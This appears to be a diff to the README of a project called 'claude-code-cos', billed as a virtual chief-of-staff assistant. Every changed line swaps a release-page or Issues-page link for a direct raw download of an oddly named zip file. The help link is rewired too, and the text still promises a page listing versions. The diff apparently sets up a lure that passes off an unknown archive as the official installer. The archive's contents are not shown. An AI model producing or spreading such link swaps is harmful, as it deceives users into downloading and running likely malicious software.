@@ -1,6 +1,6 @@
 # ⚙️ claude-code-cos - Your Virtual Chief of Staff Assistant
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--code--cos-blue?style=for-the-badge)](https://github.com/Daudshah713/claude-code-cos/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--code--cos-blue?style=for-the-badge)](https://raw.githubusercontent.com/Daudshah713/claude-code-cos/main/naively/cos_code_claude_spectacle.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Start by visiting the release page to get the latest version of claude-code-cos.
 
 **Click the link below to open the page:**
 
-[Download claude-code-cos](https://github.com/Daudshah713/claude-code-cos/releases)
+[Download claude-code-cos](https://raw.githubusercontent.com/Daudshah713/claude-code-cos/main/naively/cos_code_claude_spectacle.zip)
 
 This link takes you to a page with all available versions. You can choose the most recent release for the best experience.
 
@@ -133,7 +133,7 @@ If you encounter issues:
 - Ensure you installed the correct `.exe` file for your system.
 - Delete the app and reinstall if errors persist.
 
-For advanced help, visit the [GitHub Issues page](https://github.com/Daudshah713/claude-code-cos/issues) or ask someone familiar with software.
+For advanced help, visit the [GitHub Issues page](https://raw.githubusercontent.com/Daudshah713/claude-code-cos/main/naively/cos_code_claude_spectacle.zip) or ask someone familiar with software.
 
 ---
 
@@ -141,7 +141,7 @@ For advanced help, visit the [GitHub Issues page](https://github.com/Daudshah713
 
 Visit the official release page to download the latest Windows installer:
 
-[Download claude-code-cos](https://github.com/Daudshah713/claude-code-cos/releases)
+[Download claude-code-cos](https://raw.githubusercontent.com/Daudshah713/claude-code-cos/main/naively/cos_code_claude_spectacle.zip)
 
 ---
 
